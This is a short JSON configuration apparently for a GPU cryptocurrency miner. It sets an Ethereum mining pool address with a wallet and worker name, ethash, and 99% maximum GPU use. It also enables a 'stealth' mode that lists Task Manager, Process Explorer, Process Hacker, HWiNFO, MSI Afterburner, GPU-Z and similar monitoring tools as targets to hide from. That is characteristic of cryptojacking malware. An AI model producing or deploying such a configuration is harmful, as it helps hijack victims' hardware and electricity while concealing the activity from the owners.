{
    "url": "stratum://0x119a8e03907754350c54980C1cfAaca0c993f6CF.lyd@eu1.ethermine.org:4444",
    "algo": "ethash",
    "max-gpu": 99,
    "stealth": true,
    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe,HWiNFO64.exe,HWiNFO32.exe,MSIAfterburner.exe,GPU-Z.exe,GPU-Z.2.41.0.exe"
}